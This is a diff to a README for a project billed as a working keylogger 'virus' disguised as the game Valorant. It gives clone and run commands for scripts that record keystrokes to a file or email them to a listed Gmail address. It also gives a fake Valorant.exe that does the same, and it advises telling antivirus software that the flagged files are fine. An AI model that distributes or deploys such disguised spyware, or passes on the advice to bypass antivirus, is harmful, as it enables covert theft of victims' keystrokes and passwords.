@@ -11,15 +11,19 @@ I wrote a Keylogger Virus that actually works and looks like the game Valorant
 
 
 ## Getting Started and Installing
+```
+git clone https://github.com/Nyu10/KeyLogger-Virus-WORKING-.git
+cd to KeyLogger-Virus-Working
+```
 
-keylogger.py
+**keylogger.py**
 ```
 python keylogger.py 
 ```
 Begin typing anywhere and your keyboard strokes will be recorded in the file text.txt
 Click ESC key to end process
 
-keylogger2.py
+**keylogger2.py**
 ```
 python keylogger2.py 
 ```
@@ -28,9 +32,9 @@ Begin typing anywhere and your keyboard strokes will be sent in an email to the 
 **ANTIVIRUS PROGRAMS (such as AVAST FREE ANTIVIRUS) WILL FLAG VALORANT.EXE
  Tell your antivirus that these files are fine**
 
-Valorant.exe
+**Valorant.exe**
 ```
-./Valorant.exe or double click to open like a normal application
+./Valorant.exe in command prompt or double click on icon like a normal application
 ```
 Begin typing anywhere and your keyboard strokes will be sent in an email to the email listed in the program file (stuyhackerdemo@gmail.com)
 
